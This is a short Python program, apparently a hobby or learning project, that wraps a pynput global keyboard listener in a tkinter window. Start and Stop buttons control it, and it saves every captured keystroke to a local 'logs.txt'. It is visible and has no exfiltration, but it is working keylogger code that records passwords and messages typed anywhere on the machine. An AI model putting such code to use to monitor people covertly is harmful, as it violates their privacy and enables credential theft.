import tkinter as tk
from tkinter import messagebox
from pynput import keyboard


class KeyLoggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger GUI")

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.key_list = []
        self.is_logging = False
        self.listener = None

    def start_keylogger(self):
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.is_logging = True

        def on_press(key):
            if self.is_logging:
                self.key_list.append(str(key))

        def on_release(key):
            if key == keyboard.Key.esc:
                self.stop_keylogger()
                return False

        self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        self.listener.start()

    def stop_keylogger(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.is_logging = False

        self.listener.stop()
        self.listener.join()

        with open('logs.txt', 'w') as log_file:
            log_file.write('\n'.join(self.key_list))

        self.key_list = []
        messagebox.showinfo("Keylogger", "Keylogging has been stopped. The log has been saved in 'logs.txt'.")



root = tk.Tk()
keylogger_gui = KeyLoggerGUI(root)
root.mainloop()
